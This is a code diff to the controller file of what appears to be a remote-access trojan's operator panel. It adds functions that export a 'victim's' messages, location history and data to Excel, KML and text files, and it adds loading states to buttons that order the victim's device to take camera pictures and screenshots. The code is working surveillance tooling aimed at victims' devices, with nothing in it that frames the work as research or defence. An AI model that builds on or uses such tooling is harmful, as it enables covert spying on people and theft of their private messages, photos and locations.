@@ -102,6 +102,56 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 
 
 
+    // Initialize dropdown
+    setTimeout(() => {
+        $('.ui.dropdown').dropdown();
+    }, 500);
+
+    const victimId = remote.getCurrentWebContents().victimId;
+
+    // Export functions
+    $labCtrl.exportExcel = () => {
+        if (!victimId) {
+            $rootScope.Log('Error: Victim ID not found', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        $rootScope.Log('Requesting Excel Export...', CONSTANTS.logStatus.DEFAULT);
+        ipcRenderer.send('Export:VictimToExcel', victimId);
+    };
+
+    $labCtrl.exportKML = () => {
+        if (!victimId) {
+            $rootScope.Log('Error: Victim ID not found', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        $rootScope.Log('Requesting Location History KML...', CONSTANTS.logStatus.DEFAULT);
+        ipcRenderer.send('Export:LocationsToKML', victimId);
+    };
+
+    $labCtrl.exportMessages = () => {
+        if (!victimId) {
+            $rootScope.Log('Error: Victim ID not found', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        $rootScope.Log('Requesting Message Export...', CONSTANTS.logStatus.DEFAULT);
+        ipcRenderer.send('Export:MessagesToText', victimId);
+    };
+
+    // Listen for export results
+    // Remove listeners first to avoid duplicates if controller reloads
+    ipcRenderer.removeAllListeners('Export:Success');
+    ipcRenderer.removeAllListeners('Export:Error');
+
+    ipcRenderer.on('Export:Success', (event, data) => {
+        $rootScope.Log('Export Successful! Saved to: ' + data.filepath, CONSTANTS.logStatus.SUCCESS);
+        // Open folder containing file
+        remote.shell.showItemInFolder(data.filepath);
+    });
+
+    ipcRenderer.on('Export:Error', (event, error) => {
+        $rootScope.Log('Export Failed: ' + error, CONSTANTS.logStatus.FAIL);
+    });
+
 });
 
 
@@ -139,6 +189,12 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
             $camCtrl.selectedCam = $camCtrl.cameras[1];
             $camCtrl.$apply();
         } else if (data.image == true) { // the rseponse is picture
+
+            // Reset snap button
+            var btn = document.getElementById('snapBtn');
+            if (btn) {
+                btn.classList.remove('loading', 'disabled');
+            }
 
             $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
 
@@ -195,6 +251,13 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
     $camCtrl.snap = () => {
         // send snap request to victim
         $rootScope.Log('Snap a picture');
+
+        // Add loading state
+        var btn = document.getElementById('snapBtn');
+        if (btn) {
+            btn.classList.add('loading', 'disabled');
+        }
+
         socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
     }
 
@@ -687,6 +750,12 @@ app.controller("ScreenshotCtrl", function ($scope, $rootScope) {
 
     $screenshotCtrl.takeScreenshot = () => {
         $rootScope.Log('Sending screenshot command...', CONSTANTS.logStatus.DEFAULT);
+
+        var btn = document.getElementById('takeScreenshotBtn');
+        if (btn) {
+            btn.classList.add('loading', 'disabled');
+        }
+
         socket.emit(ORDER, { order: 'x0000ss' });
     };
 
@@ -711,6 +780,12 @@ app.controller("ScreenshotCtrl", function ($scope, $rootScope) {
     // Listen for screenshot data
     var ssHandler = (data) => {
         if (data.screenshot) {
+            // Reset button
+            var btn = document.getElementById('takeScreenshotBtn');
+            if (btn) {
+                btn.classList.remove('loading', 'disabled');
+            }
+
             $rootScope.Log('Screenshot received from ' + (data.app || 'Unknown'), CONSTANTS.logStatus.SUCCESS);
 
             // Convert buffer to base64
